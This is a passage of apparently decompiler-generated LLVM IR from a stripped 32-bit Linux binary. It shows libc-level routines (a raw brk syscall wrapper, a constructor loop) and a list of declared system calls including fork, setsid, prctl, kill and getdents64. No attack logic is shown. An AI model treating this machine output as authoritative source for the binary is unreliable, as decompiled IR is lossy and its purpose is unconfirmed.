  uselistorder i32 %v3_8052262, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052297, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_805224e.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 13, 15, 14, 2, 0, 3, 4, 5, 16, 11, 6, 7, 9, 8, 12, 10 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 14, 15, 16, 17, 18, 19, 20, 11, 4, 8, 5 }
  uselistorder i32 10, { 0, 6, 5, 3, 7, 1, 12, 8, 9, 10, 11, 4, 2 }
  uselistorder i16 0, { 0, 2, 1, 5, 6, 7, 8, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 9, 0, 2, 3, 29, 5, 4, 1, 10, 11, 19, 17, 21, 25, 6, 7, 8, 12, 13, 14, 15, 16, 18, 20, 22, 23, 24, 26, 27, 28, 30 }
  uselistorder i8 0, { 23, 24, 36, 35, 20, 21, 22, 11, 13, 14, 15, 16, 17, 18, 4, 19, 12, 29, 1, 25, 30, 31, 27, 28, 32, 26, 33, 0, 34, 2, 3, 10, 5, 6, 7, 8, 9 }
  uselistorder i32 2, { 28, 33, 11, 34, 0, 53, 13, 54, 14, 26, 1, 2, 3, 29, 4, 5, 6, 15, 16, 30, 7, 8, 18, 9, 20, 17, 19, 23, 21, 22, 35, 36, 37, 38, 39, 50, 32, 42, 44, 41, 43, 45, 46, 47, 31, 40, 48, 49, 10, 27, 25, 24, 12, 51, 52 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80522bf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80522bd, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805225f, { 1, 0 }
  uselistorder label %dec_label_pc_805224b, { 1, 0 }
}

define i32 @function_80522c5(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522c5:
  %v0_80522c8 = call i32 @function_804fb07()
  %v0_80522cd = load i32, i32* @edx, align 4
  %v4_80522d4 = call i32 @function_804fb92(i32 %v0_80522c8, i32 %arg1, i32 %v0_80522cd, i32 %v0_80522cd)
  ret i32 %v4_80522d4

; uselistorder directives
  uselistorder i32* @edx, { 94, 83, 0, 2, 62, 63, 1, 8, 9, 13, 7, 90, 16, 97, 98, 104, 103, 96, 66, 76, 3, 77, 78, 79, 80, 81, 82, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 64, 65, 10, 5, 11, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 55, 56, 57, 58, 59, 60, 100, 12, 14, 15, 61, 99, 93, 95, 101, 102, 84, 85, 86, 87, 88, 89, 92, 91, 105 }
}

define i32 @function_80522dd() local_unnamed_addr {
dec_label_pc_80522dd:
  %v0_80522dd = load i32, i32* @eax, align 4
  %v1_80522dd = add i32 %v0_80522dd, 28
  %v2_80522dd = inttoptr i32 %v1_80522dd to i32*
  %v3_80522dd = load i32, i32* %v2_80522dd, align 4
  store i32 %v3_80522dd, i32* @global_var_8053698.72, align 8
  %v1_80522e6 = add i32 %v0_80522dd, 44
  %v2_80522e6 = inttoptr i32 %v1_80522e6 to i32*
  %v3_80522e6 = load i32, i32* %v2_80522e6, align 4
  store i32 %v3_80522e6, i32* @global_var_805369c.73, align 4
  ret i32 %v3_80522e6

; uselistorder directives
  uselistorder i32 44, { 8, 1, 0, 5, 7, 6, 2, 3, 4 }
  uselistorder i32 28, { 22, 12, 13, 9, 10, 11, 14, 1, 2, 8, 5, 3, 0, 6, 7, 15, 4, 16, 17, 18, 19, 20, 21 }
}

define i32 @function_80522ef(i32 %arg1) local_unnamed_addr {
dec_label_pc_80522ef:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522ef = load i32, i32* @ebx, align 4
  store i32 %v0_80522ef, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8052302 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052302, i32* @global_var_8053158.70, align 8
  %v7_805230d = icmp ult i32 %v1_8052302, %arg1
  %v1_805230f = icmp eq i1 %v7_805230d, false
  br i1 %v1_805230f, label %dec_label_pc_805231f, label %dec_label_pc_8052311

dec_label_pc_8052311:                             ; preds = %dec_label_pc_80522ef
  %v1_8052311 = call i32 @function_804ffeb(i32 %v0_80522ef)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052319 = inttoptr i32 %v1_8052311 to i32*
  store i32 12, i32* %v1_8052319, align 4
  %v0_805231f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052323.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805231f

dec_label_pc_805231f:                             ; preds = %dec_label_pc_80522ef, %dec_label_pc_8052311
  %v2_8052323 = phi i32 [ %v0_80522ef, %dec_label_pc_80522ef ], [ %v2_8052323.pre, %dec_label_pc_8052311 ]
  %v0_805231f = phi i32 [ 0, %dec_label_pc_80522ef ], [ %v0_805231f.pre, %dec_label_pc_8052311 ]
  store i32 %v2_8052323, i32* @ebx, align 4
  ret i32 %v0_805231f

; uselistorder directives
  uselistorder i32 %v1_8052302, { 1, 0 }
  uselistorder i32 12, { 42, 19, 20, 14, 15, 16, 7, 51, 52, 53, 54, 55, 56, 57, 43, 44, 45, 46, 47, 48, 49, 50, 8, 9, 10, 11, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 5, 39, 6, 17, 18, 40, 41, 58, 61, 62, 72, 83, 73, 74, 60, 67, 63, 69, 70, 1, 66, 68, 2, 75, 59, 64, 65, 71, 76, 4, 77, 78, 80, 81, 3, 79, 82, 0 }
  uselistorder i32* @global_var_8053158.70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805231f, { 1, 0 }
}

define i32 @function_8052325() local_unnamed_addr {
dec_label_pc_8052325:
  %v0_8052328 = load i32, i32* @eax, align 4
  %v1_805232a = sub i32 0, %v0_8052328
  %v1_805232c = call i32 @function_804ffeb(i32 ptrtoint (i32* @0 to i32))
  %v2_8052331 = inttoptr i32 %v1_805232c to i32*
  store i32 %v1_805232a, i32* %v2_8052331, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_804ffeb, { 39, 32, 43, 11, 31, 47, 42, 10, 48, 9, 5, 8, 41, 40, 38, 49, 7, 21, 6, 30, 46, 37, 36, 35, 45, 44, 34, 33, 17, 16, 15, 20, 4, 3, 29, 19, 28, 27, 26, 2, 13, 25, 24, 12, 22, 18, 1, 0, 23, 14 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 7, 21, 8, 9, 10, 22, 23, 24, 25, 26, 11 }
}

define i32 @function_8052340() local_unnamed_addr {
dec_label_pc_8052340:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805234c = load i32, i32* @global_var_8053000.57, align 4096
  %v10_8052351 = icmp eq i32 %v0_805234c, -1
  br i1 %v10_8052351, label %dec_label_pc_8052362, label %dec_label_pc_8052356.preheader

dec_label_pc_8052356.preheader:                   ; preds = %dec_label_pc_8052340
  br label %dec_label_pc_8052356

dec_label_pc_8052356:                             ; preds = %dec_label_pc_8052356.preheader, %dec_label_pc_8052356
  %v4_8052359 = phi i32 [ %v0_805234c, %dec_label_pc_8052356.preheader ], [ %v2_805235b, %dec_label_pc_8052356 ]
  %v0_8052356 = phi i32 [ ptrtoint (i32* @global_var_8053000.57 to i32), %dec_label_pc_8052356.preheader ], [ %v1_8052356, %dec_label_pc_8052356 ]
  %v1_8052356 = add i32 %v0_8052356, -4
  call void @__pseudo_call(i32 %v4_8052359)
  %v1_805235b = inttoptr i32 %v1_8052356 to i32*
  %v2_805235b = load i32, i32* %v1_805235b, align 4
  %v10_805235d = icmp eq i32 %v2_805235b, -1
  %v1_8052360 = icmp eq i1 %v10_805235d, false
  br i1 %v1_8052360, label %dec_label_pc_8052356, label %dec_label_pc_8052362.loopexit

dec_label_pc_8052362.loopexit:                    ; preds = %dec_label_pc_8052356
  %v2_8052362.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052362

dec_label_pc_8052362:                             ; preds = %dec_label_pc_8052362.loopexit, %dec_label_pc_8052340
  %v2_8052362 = phi i32 [ %v2_8052362.pre, %dec_label_pc_8052362.loopexit ], [ %tmp6, %dec_label_pc_8052340 ]
  ret i32 %v2_8052362

; uselistorder directives
  uselistorder i32 %v0_805234c, { 1, 0 }
  uselistorder i1 false, { 123, 51, 70, 71, 73, 72, 0, 52, 53, 54, 34, 35, 134, 135, 136, 137, 139, 11, 140, 141, 138, 133, 124, 21, 126, 127, 128, 2, 129, 130, 131, 132, 1, 62, 63, 64, 65, 66, 67, 56, 57, 58, 59, 60, 61, 55, 22, 23, 24, 25, 26, 27, 28, 29, 30, 36, 37, 38, 39, 5, 40, 41, 10, 43, 42, 46, 44, 45, 6, 12, 47, 48, 125, 31, 3, 32, 33, 92, 93, 14, 49, 50, 68, 81, 82, 94, 4, 88, 74, 95, 96, 15, 83, 84, 16, 85, 86, 89, 17, 78, 79, 90, 97, 7, 69, 75, 8, 76, 77, 80, 87, 91, 98, 99, 18, 100, 19, 122, 101, 102, 103, 104, 105, 106, 107, 9, 108, 109, 110, 111, 112, 113, 114, 115, 121, 116, 119, 117, 118, 120, 142, 20, 13, 143 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 50, 52, 53, 54, 4, 51, 1, 49, 12, 38, 5, 39, 40, 41, 6, 0, 2, 3, 42, 43, 44, 45, 46, 47, 48, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 ptrtoint (i32* @global_var_8053000.57 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 22, 23, 0, 83, 161, 47, 84, 15, 48, 85, 49, 86, 50, 87, 51, 88, 52, 89, 53, 90, 54, 91, 55, 92, 56, 93, 16, 17, 6, 5, 57, 58, 94, 59, 95, 60, 96, 24, 1, 97, 46, 61, 98, 162, 8, 9, 99, 7, 100, 25, 150, 26, 101, 148, 28, 29, 18, 13, 30, 62, 31, 102, 27, 149, 3, 103, 104, 19, 20, 21, 105, 10, 12, 32, 2, 63, 146, 147, 155, 156, 64, 151, 33, 65, 106, 66, 107, 67, 108, 44, 45, 109, 68, 110, 69, 111, 70, 112, 71, 113, 72, 114, 73, 115, 74, 116, 75, 117, 76, 118, 77, 119, 78, 120, 79, 121, 80, 122, 81, 123, 34, 154, 4, 11, 124, 157, 152, 38, 125, 36, 41, 126, 42, 127, 37, 43, 128, 158, 35, 129, 130, 131, 132, 133, 153, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 39, 159, 145, 160, 14, 40, 82 }
  uselistorder i32 1, { 155, 156, 44, 99, 100, 294, 0, 295, 101, 333, 157, 12, 11, 13, 158, 8, 7, 6, 159, 9, 160, 161, 10, 163, 162, 30, 164, 3, 165, 31, 166, 70, 167, 34, 168, 71, 169, 83, 170, 90, 171, 172, 15, 14, 16, 116, 37, 174, 173, 176, 175, 4, 177, 21, 179, 178, 33, 180, 184, 183, 182, 181, 42, 334, 335, 336, 187, 186, 185, 92, 91, 102, 188, 191, 190, 189, 60, 103, 149, 253, 117, 192, 150, 195, 194, 193, 59, 118, 289, 290, 291, 196, 35, 284, 285, 104, 286, 287, 288, 25, 23, 24, 95, 283, 119, 86, 87, 88, 89, 120, 105, 254, 255, 256, 257, 199, 198, 197, 40, 39, 38, 41, 121, 200, 26, 27, 123, 260, 261, 262, 263, 264, 265, 266, 267, 268, 122, 269, 270, 271, 272, 273, 106, 274, 275, 93, 107, 276, 277, 278, 279, 108, 109, 280, 281, 282, 203, 202, 201, 52, 48, 49, 51, 50, 110, 111, 204, 112, 113, 208, 207, 206, 205, 55, 124, 151, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 258, 259, 221, 20, 19, 18, 222, 223, 125, 126, 224, 225, 114, 227, 226, 56, 127, 228, 229, 17, 230, 22, 231, 63, 232, 54, 233, 84, 234, 62, 235, 29, 236, 5, 237, 36, 28, 239, 238, 43, 240, 45, 241, 85, 243, 242, 77, 244, 57, 245, 53, 246, 32, 58, 248, 247, 64, 308, 115, 309, 310, 96, 315, 94, 47, 46, 311, 153, 65, 66, 68, 67, 312, 154, 78, 80, 79, 82, 81, 69, 296, 297, 298, 299, 300, 301, 316, 128, 317, 138, 293, 134, 306, 144, 145, 130, 313, 140, 305, 132, 307, 318, 142, 292, 143, 139, 302, 303, 136, 304, 137, 141, 135, 133, 131, 129, 314, 319, 146, 320, 321, 332, 322, 323, 324, 325, 326, 327, 330, 147, 331, 72, 73, 76, 74, 75, 328, 329, 152, 250, 249, 61, 1, 148, 2, 97, 98, 337, 252, 251 }
  uselistorder label %dec_label_pc_8052356, { 1, 0 }
}

define i32 @function_8052366() local_unnamed_addr {
entry:
  %v0_8052369 = load i32, i32* @ebx, align 4
  %v1_805236a = call i32 @function_80480b0(i32 %v0_8052369)
  store i32 %v1_805236a, i32* @eax, align 4
  %v0_8052375 = call i32 @function_80480c0()
  ret i32 %v0_8052375

; uselistorder directives
  uselistorder i32* @eax, { 7, 16, 39, 41, 42, 43, 44, 46, 11, 47, 0, 45, 4, 6, 40, 24, 26, 27, 25, 12, 13, 17, 18, 19, 20, 22, 23, 21, 1, 14, 15, 10, 2, 28, 29, 8, 9, 30, 34, 35, 36, 31, 32, 33, 48, 37, 38, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 206, 31, 150, 32, 267, 268, 4, 269, 270, 271, 5, 33, 67, 68, 207, 208, 34, 199, 241, 242, 243, 79, 244, 357, 245, 188, 200, 201, 358, 186, 185, 359, 360, 361, 187, 202, 203, 209, 210, 183, 362, 297, 16, 17, 363, 69, 370, 371, 6, 35, 151, 7, 152, 153, 381, 382, 61, 383, 36, 140, 37, 80, 81, 0, 364, 365, 366, 38, 184, 147, 369, 39, 372, 13, 141, 40, 70, 374, 377, 376, 11, 12, 254, 255, 248, 249, 250, 71, 251, 252, 253, 18, 19, 20, 21, 246, 82, 247, 83, 154, 189, 28, 190, 72, 155, 191, 211, 212, 213, 214, 215, 216, 217, 218, 219, 73, 74, 220, 156, 221, 157, 158, 84, 142, 159, 85, 143, 41, 160, 222, 223, 42, 43, 86, 144, 30, 224, 225, 226, 44, 45, 87, 145, 29, 227, 62, 228, 27, 229, 230, 232, 161, 231, 1, 375, 367, 368, 192, 193, 195, 194, 14, 15, 2, 75, 196, 197, 198, 272, 204, 205, 162, 163, 233, 234, 235, 236, 237, 238, 239, 240, 164, 256, 257, 298, 373, 258, 299, 259, 260, 261, 378, 76, 355, 262, 263, 356, 273, 300, 379, 380, 46, 47, 264, 49, 48, 50, 165, 301, 51, 166, 52, 167, 287, 168, 169, 302, 274, 275, 276, 278, 279, 352, 303, 304, 22, 170, 54, 171, 305, 306, 280, 172, 289, 173, 307, 308, 295, 296, 265, 266, 290, 291, 292, 281, 282, 283, 284, 285, 286, 288, 293, 294, 8, 64, 65, 60, 174, 53, 175, 309, 63, 310, 311, 55, 349, 350, 351, 176, 312, 313, 314, 315, 316, 317, 318, 319, 325, 148, 320, 321, 322, 323, 324, 326, 177, 178, 56, 179, 329, 330, 331, 332, 333, 77, 23, 334, 335, 336, 180, 277, 344, 345, 346, 347, 337, 338, 339, 343, 348, 24, 78, 327, 328, 57, 146, 25, 340, 341, 342, 9, 26, 149, 10, 58, 181, 3, 353, 354, 59, 182, 66, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 384, 385, 386, 387, 388, 389, 390, 391 }
  uselistorder i32* @ebx, { 12, 113, 114, 63, 64, 37, 115, 0, 116, 117, 222, 118, 15, 16, 223, 14, 224, 225, 226, 227, 228, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 65, 1, 66, 67, 68, 13, 229, 230, 181, 182, 69, 70, 231, 232, 233, 10, 11, 251, 252, 253, 254, 8, 2, 7, 236, 245, 249, 250, 234, 235, 241, 242, 119, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 122, 123, 3, 124, 125, 120, 121, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 4, 28, 29, 30, 31, 32, 33, 34, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 9, 85, 86, 87, 88, 89, 5, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 239, 240, 35, 36, 56, 57, 58, 59, 60, 61, 62, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 136, 137, 138, 139, 140, 183, 184, 237, 238, 141, 185, 186, 142, 143, 144, 243, 244, 218, 219, 145, 146, 220, 221, 150, 151, 187, 188, 246, 247, 248, 147, 152, 153, 154, 155, 156, 157, 158, 170, 171, 189, 190, 159, 160, 161, 191, 149, 165, 162, 167, 168, 169, 164, 166, 172, 173, 148, 174, 163, 175, 176, 177, 178, 179, 180, 192, 193, 194, 195, 196, 197, 198, 200, 199, 210, 211, 212, 6, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 216, 217 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_5() local_unnamed_addr

declare i64 @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
